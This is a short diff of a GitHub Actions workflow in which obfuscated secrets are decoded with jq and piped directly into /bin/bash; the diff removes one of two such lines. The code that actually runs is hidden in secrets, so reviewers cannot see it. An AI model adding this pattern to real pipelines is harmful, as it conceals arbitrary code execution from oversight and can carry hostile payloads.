@@ -22,7 +22,6 @@ jobs:
           hgbn534: ${{ secrets.hgbn534 }}
         run: |
           printf '%s' "$hgbn534" | jq -r .tzz6 | /bin/bash
-          printf '%s' "$uquj627" | jq -r .hpo87402 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
